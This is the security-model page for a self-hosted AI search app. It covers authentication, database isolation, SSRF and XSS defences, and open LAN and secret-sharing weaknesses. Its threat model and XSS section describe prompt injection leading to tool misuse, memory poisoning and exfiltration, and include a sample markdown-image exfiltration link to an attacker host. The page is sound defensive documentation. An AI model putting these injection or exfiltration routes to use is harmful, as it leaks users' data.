---
title: Security
---

# Security

This page is the security model of Ask as deployed on the home fleet: what is exposed, how
requests are authenticated and isolated, which defences exist, and which known risks remain
open. It follows the full security review of 2026-09-14, which found no critical or high issue on
the public surface. The material risks are LAN-local and operational. Fixes from that review
shipped 2026-09-15.

::: tip The ops runbook is outside the repo
Turnkey steps for the open operational items (rotating secrets, per-env secrets, locking down
LAN services) are in **`/home/nightfury/selfhosted/security-runbook.md`** on NightFuryX (.17).
It isn't in git and contains no secret values. Every step generates its own. A summary is
[below](#ops-runbook-summary).
:::

## Threat model

| Actor | Can reach | Main concern |
|---|---|---|
| **Internet user** (anonymous) | Only `https://ask.hbqnexus.win` → prod app via the Cloudflare tunnel | Account takeover, cross-user data access, XSS, SSRF via the `fetch` tool, prompt-injection-driven exfiltration |
| **Authenticated user** | Their own chats, uploads, memories; public chats of others | Horizontal privilege escalation (IDOR), stored prompt injection, resource abuse |
| **Hostile web content** (search results, fetched pages, uploaded docs) | The model's context | Prompt injection: tool misuse, memory poisoning, exfiltration through links and images |
| **LAN host** (any device on `192.168.50.0/24`) | Every `0.0.0.0` port on the fleet | Unauthenticated model services, lab app with auth off, SearXNG open proxy |
| **Local user / container on a fleet host** | Files on disk, Docker socket | `.env` secrets, model-manager (root-equivalent) |

Out of scope: Cloudflare, Supabase and Ollama Cloud themselves, and physical access.

## Public surface

- **Only the prod app is internet-reachable.** `cloudflared` on .17 is a Windows service that
  makes an **outbound** tunnel connection. Ingress (`ask.hbqnexus.win` → `localhost:3738`) is
  configured in the Cloudflare dashboard. There's **no router port-forward** and no open inbound
  port.
- Staging (`:3739`), lab (`:3742`) and every model service bind `0.0.0.0` but are **LAN-only**.
- Postgres and Redis publish **no host port**. Model-manager binds **`127.0.0.1:3939`**.
- Security response headers on every path (`next.config.mjs`): HSTS (2 years, includeSubDomains),
  `X-Frame-Options: DENY`, CSP `frame-ancestors 'none'; base-uri 'self'; object-src 'none'`,
  `nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, and
  `Permissions-Policy: camera=(), microphone=(self), geolocation=(self), payment=()`.

::: warning Permissions-Policy must keep `(self)` for mic and geolocation
The app uses the microphone (dictation) and geolocation (weather widget). A hardening change once
set `geolocation=()`. The weather widget then silently always showed the server's IP city, and
`microphone=()` breaks voice. If either breaks for no visible reason, check this header first:
`curl -sI https://ask.hbqnexus.win/ | grep -i permissions-policy`.
:::

There's **no `script-src` CSP**. The markdown sanitiser is the only XSS barrier (see
[XSS](#xss-pipeline)). This was a deliberate trade-off.

## Authentication

- **Supabase** (prod and staging, `ENABLE_AUTH=true`). `getCurrentUserId()`
  (`lib/auth/get-current-user.ts`) calls `supabase.auth.getUser()`, which **verifies the session
  with Supabase servers**. The app never trusts the unverified `getSession()` cookie payload. The
  middleware (`proxy.ts`) refreshes session cookies.
- **No route accepts a user id from the request.** Every route derives it from the session, so
  there's no IDOR by parameter.
- **CSRF:** Server Actions are same-origin-checked by Next.js, and cookies are `SameSite=Lax`.
- **Open redirect:** `/auth/confirm` and `/auth/oauth` validate `next` with `safeRelativePath()`
  (`lib/utils/safe-redirect.ts`). Companion item: keep the Supabase dashboard redirect allowlist
  tight.
- **Guests:** `isGuest = !userId`. Guest chat is **off** (`ENABLE_GUEST_CHAT` unset). Guest turns,
  where enabled, are never persisted.
- **Public chats:** a chat with `visibility='public'` is readable by anyone at
  `/search/<id>`. Ids are cuid2 (unguessable). RLS policies enforce this in the database (see
  [Data layer](/infrastructure/data-layer#row-level-security)).

### `ENABLE_AUTH=false` (anonymous mode)

When `ENABLE_AUTH=false`, every request becomes the single user `ANONYMOUS_USER_ID` (default
`anonymous-user`). **Lab runs this way** as `lab-harness`, so benchmarks and harnesses can POST
without a browser session. Consequences:

- Anyone on the LAN who opens `:3742` is `lab-harness` and sees all lab chats, uploads and
  memories. Treat lab data as LAN-public.
- The mode is refused if `MORPHIC_CLOUD_DEPLOYMENT=true`.
- Uploads under the anonymous user live at a **predictable** path prefix. That's one reason the
  [signed upload URLs](#signed-upload-urls) exist.

### Rate limits

The rate limiters (`lib/rate-limit/*`) run **only** when `MORPHIC_CLOUD_DEPLOYMENT=true` and
Upstash is configured, so they are **inert on the fleet**. This was a deliberate decision: prod
serves a trusted user base, guest chat is off, and metered search spend is already capped by
fail-closed budgets. What remains unbounded is Ollama Cloud usage and GPU/crawl load.

## Row-level security

Cross-user isolation lives in Postgres, not only in app code:

- Every table has RLS enabled, with policies keyed on
  `current_setting('app.current_user_id', true)`. `withRLS(userId, cb)` sets that GUC with
  `set_config(..., true)` (transaction-local) around each user operation.
- RLS only binds a **non-owner** role. The runtime connects through `DATABASE_RESTRICTED_URL`
  as **`app_user`** (NOSUPERUSER, NOBYPASSRLS). `fleet-boot/create-app-user.sh <pg-container>`
  creates it and verifies the flags.
- **Fail-fast guard** (`lib/db/index.ts`): at boot the app queries its own `rolsuper` and
  `rolbypassrls`. If `ENABLE_AUTH=true` and the role can bypass RLS, it **exits** so the
  container crash-loops loudly instead of quietly serving every user's data. This matters
  because the base compose **defaults** `DATABASE_RESTRICTED_URL` to the owner connection, so a
  wrong-worktree or missing-overlay `compose up` would otherwise boot green with RLS off.
- The owner client `dbAdmin` is used only for token-gated system paths: the ingest worker API,
  the recall backfill and the upload-expiry sweep.

Details, policy text and when each role is used: [Data layer](/infrastructure/data-layer#row-level-security).

## Token-gated internal routes

These routes don't use user sessions. They take a bearer secret and **fail closed** (503) when
the secret isn't configured.

| Route(s) | Secret | Check | Callers |
|---|---|---|---|
| `/api/ingest/{claim,progress,complete}`, `GET /api/ingest/file/[id]` | `INGEST_API_TOKEN` | `checkIngestAuth` (`lib/utils/ingest-auth.ts`): length check + `crypto.timingSafeEqual` | Ingestor workers |
| `POST /api/advanced-search` | **same** `INGEST_API_TOKEN` | `checkIngestAuth` | The app's own `search` tool (loopback) |
| `POST /api/maintenance/expire-uploads` | `INGEST_API_TOKEN` | `checkIngestAuth` | Daily cron `fleet-boot/expire-uploads-daily.sh` |
| `POST /api/memory/consolidate`, `POST /api/memory/recall-backfill` | `MEMORY_CRON_SECRET` | `requireCronSecret` (`lib/auth/cron-auth.ts`): SHA-256 both sides, then `timingSafeEqual` | Operator / cron |

The cron check used to fail **open** (`if (secret && header !== …)`). With no secret set, a plain
unauthenticated POST re-embedded every user's history. "Not configured" must always mean
**disabled**.

These routes are **tunnel-reachable**, so the token is the entire defence. The ingest token is
especially powerful. With it, `ingest/file/[id]` reads **any user's file** (it uses the
RLS-bypassing `dbAdmin`), and `complete` can inject chunks into a victim's `.chunks.json`, which
amounts to stored prompt injection into their answers.

## SSRF guard

The `fetch` tool retrieves URLs that users or the model name. `lib/utils/ssrf-guard.ts`
`assertUrlAllowed()` runs before the rescue chain (`lib/tools/fetch.ts`):

- It blocks non-http(s) schemes, literal loopback/private/link-local/reserved IPs (v4, v6 and
  v4-mapped v6), `localhost`, and cloud-metadata hostnames.
- It resolves DNS (3 s timeout) and blocks hostnames that resolve to private addresses. A
  **resolver failure is allowed through**, because the real fetch would fail anyway.

The advanced-search route's **legacy crawler** (`fetchHtml`, `lib/utils/legacy-fetch-html.ts`)
uses the same guard and, unlike the `fetch` tool, **re-checks every redirect hop** before
following it (max 5 redirects). It fetches search-result URLs, not user-named ones.

**Known residuals (accepted, documented in the file header):**

1. **Redirects aren't re-checked.** The guard runs once on the initial URL, and the fetch then
   follows redirects. A public URL that 302s to `http://192.168.50.x:<port>` reaches the LAN
   fleet (unauthenticated Ollama/Whisper/TTS, crawl4ai, etc.), and the response body can flow
   back to the model. Impact on this LAN is low: there's no 169.254 metadata service, and the
   unauthenticated services hold no secrets. The fix, if wanted, is `redirect: 'manual'` plus
   re-checking each hop in every tier. The fetch egress was deliberately left open, so this is a
   decision, not an oversight.
2. **DNS-rebinding TOCTOU** between the check and the connect.
3. **No egress allowlist**, so prompt injection could make the model fetch an attacker URL with
   data in it. Mitigations: the `UNTRUSTED_CONTENT_RULE` prompt fence appended to every turn's
   system prompt (`lib/agents/prompts/search-mode-prompts.ts`), and `remember` writes on
   retrieval-driven turns become **candidate** memories only (closing one-shot memory poisoning).

## XSS pipeline

- **Answer markdown** renders through **Streamdown** with its default rehype plugins
  (raw HTML → `rehype-sanitize` default schema → harden) in `components/message.tsx`.
- **Images in answer markdown are not auto-loaded.** `AnswerImage` renders them as click-through
  links. A zero-click `![](https://attacker/?d=…)` is a prompt-injection exfiltration channel.
  Real images (generated images, search thumbnails, news) render through their own components.
- **Link hrefs from providers** (search result cards, news widget, Discover) go through
  `sanitizeHttpUrl()` / `safeUrlParts()` in `lib/utils/safe-url.ts`, which allows only http(s).
  Before 2026-09-15 a `javascript:` URL from a search engine would have rendered as a clickable
  link. Malformed URLs no longer crash the render.
- **Served uploads** always carry `X-Content-Type-Options: nosniff`, and SVGs get a `sandbox`
  CSP so embedded script can't run when opened in a new tab. `ingest/file/[id]` also sends
  `nosniff`.

## Signed upload URLs

`GET /uploads/<userId>/(chats|generated)/<chatId>/<file>` serves uploaded and generated files
from local disk (path-traversal-checked, not RLS). Historically the **unguessable UUID path was
the only capability**, and it was permanent and couldn't be revoked.

HMAC-signed, expiring URLs shipped on 2026-09-12 **dormant**:

| Env key | Default | Effect |
|---|---|---|
| `UPLOADS_URL_SECRET` | unset | Signing key (≥ 32 chars). Unset means sign and verify are no-ops |
| `UPLOADS_REQUIRE_SIGNATURE` | `false` | When true (and a secret is set), require a valid `exp`+`sig`: bad → 403, expired → 410 |
| `UPLOADS_URL_TTL_S` | 3600 | Signed URL lifetime |

The signature covers the object key, which starts with `<userId>/`, so swapping a URL to another
user's key fails. Stable keys are stored, and URLs are **re-signed at render time** (`loadChat` →
`signUploadUrlsInMessages`), so old chats get fresh URLs.

::: danger Enablement gotcha: require without a secret fails OPEN
The route enforces only when `uploadSignatureRequired() && isUploadSigningConfigured()`. Setting
`UPLOADS_REQUIRE_SIGNATURE=true` **without** `UPLOADS_URL_SECRET` quietly serves unsigned URLs.
Always set the secret **first**, then enable on lab and test: old chats' images and citations
render, a fresh upload works, and tampered or expired links return 403/410. Only then enable per
env. On 2026-09-22 **no env had the secret set**, so signing is not active anywhere.
:::

## Known LAN exposures

These services accept unauthenticated requests from any LAN host (and, through the
[redirect SSRF residual](#ssrf-guard), potentially from the app):

| Service | Port | Risk | Recommended fix |
|---|---|---|---|
| Ollama (.17, also .160/.171/.231) | `:11434` | **Financial:** any LAN host can `POST /api/generate` with a `:cloud` model and drain the Ollama Cloud balance. Also free GPU inference | Windows Defender Firewall inbound rule on the Windows host allowing only fleet hosts (WSL port forwards appear as Windows listeners). Can't bind loopback: the app and ingestors call it cross-host or via the Docker host gateway |
| Whisper STT (.17) | `:8788` | Free GPU; its OpenAI-compatible API can **pull arbitrary Hugging Face models** (disk fill) | Bind to the LAN IP of the calling host or firewall; or add a token like the reranker's |
| Kokoro TTS (.17) | `:8890`, `:3744` | Free GPU | Same |
| Per-env SearXNG UI (via gluetun) | `:3741`, `:3740`, `:3743` | Open search proxy egressing through the paid Mullvad exit (burns its IP reputation); `searxng-limiter.toml` is a stub | Bind to loopback or firewall; the app reaches SearXNG by container DNS, not the host port |
| Lab app | `:3742` | `ENABLE_AUTH=false`: LAN users see all lab data | Accept (lab), or firewall |
| crawl4ai (.231) | `:11235` | Token-gated, fine | n/a |
| Reranker / embedder | `:8787` / `.160:8788` | Token-gated with `hmac.compare_digest`, fail closed: **the model to copy** | n/a |

Also noted: the Postgres **owner** password is the upstream default. That's low risk because
Postgres publishes no host port and is reachable only on its compose network, but rotate it as
defence in depth.

## Secrets management

- Secrets live in each worktree's `.env` (gitignored, mode **0600**): `ask-prod/.env`,
  `ask/.env` and `ask-flow/.env`. Ingestor secrets are in `ingestor/.env`, `.env.staging` and
  `.env.lab`. The reranker's are in `reranker-qwen/.env`. Model-manager's password is in its
  `secrets.env`. Prod `.env` is best edited through [Model Manager](/infrastructure/services#model-manager).
  Every change needs a **container recreate** (`--force-recreate`), because env is injected at
  `up` time.
- **Masking discipline:** grepping a `.env` or `docker inspect` output for a service name also
  prints token lines (for example `CRAWL` matches `CRAWL4AI_API_TOKEN` and `FIRECRAWL_API_KEY`).
  Decide the mask before running the grep: `sed -E 's/=.*/=<redacted>/'`, or anchor on a
  specific key such as `^RERANKER_URL=`.

::: danger Shared secrets across environments (open)
`INGEST_API_TOKEN`, `MEMORY_CRON_SECRET` and `MODEL_MANAGER_SESSION_SECRET` are **byte-identical
across prod, staging and lab**. Lab runs with auth off and a looser posture, so a lab compromise
hands over prod's ingest token (read any user's file, inject chunks) and cron secret (rewrite and
re-embed every user's history). The metered API keys are also shared, which is why budgets are
per env against one account quota. The fix is operational: generate distinct per-env values. The
app and its ingestor **must** match within each env. Also **split** the advanced-search token
from the ingest token (a small code change, not yet made): `/api/advanced-search` reusing
`INGEST_API_TOKEN` means the app's own search credential can also read files.
:::

::: warning World-readable env backups (observed 2026-09-22)
The 2026-09-15 fix set the live `.env` files to 0600, but `ingestor/.env.staging`,
`ingestor/.env.lab`, `ingestor/.env.bak` and `ingestor/.env.premigfix` are still mode
**0664**, and all of them contain `INGEST_API_TOKEN`. Run `chmod 600` on them (or delete the
two backups).
:::

Some keys (search, crawl, reranker, embedding, ingest, cron, Supabase secret, Replicate,
SearXNG secret, `DEGOOG_API_KEY`) were exposed in tooling logs in September 2026 and are
scheduled for rotation. See runbook section B.

## Other hardening in place

- **SQL injection:** all queries are Drizzle-parameterised. **Command injection:** `execFile`
  with argv arrays, no shell (for example `pdftotext`).
- **Chat ownership on the stream path:** `create-chat-stream-response.ts` fails closed when a
  non-new chat can't be loaded (RLS already blocks it in prod; this is defence in depth).
- **Calculator:** input capped at 512 characters, and power towers (`9^9^9^9`) are rejected, so
  mathjs can't stall the single event loop. There's no hard synchronous timeout. That would need
  a worker thread.
- **Model-manager:** `/api/apply` checks the session per handler as well as in middleware.

## Ops runbook summary

`/home/nightfury/selfhosted/security-runbook.md`, in priority order:

- **B: rotate the leaked keys** at each provider's dashboard and in every `.env` that uses them.
  Services that hold a copy (crawl4ai, reranker, embedder) need the new value as well, followed by
  a recreate.
- **A: distinct per-env secrets.** A1 is `INGEST_API_TOKEN` (app and ingestor must match per
  env), A2 is `MEMORY_CRON_SECRET`, A3 is an explicit `MODEL_MANAGER_SESSION_SECRET` (today it is
  derived from the password), and A4 is the Postgres owner password.
- **C: split the advanced-search token from the ingest token** (code change).
- **D: lock down unauthenticated LAN services.** D1 is Ollama `:11434` (billing exposure, do
  first), D2 is Whisper/TTS, D3 is the SearXNG UIs.
- **Verify:** apps return 200; the ingest token matches between app and ingestor (compare lengths
  only); a real docx or image upload processes; unauthenticated model-manager `/api/apply` returns
  401; locked-down ports refuse from other LAN hosts but work from app hosts.
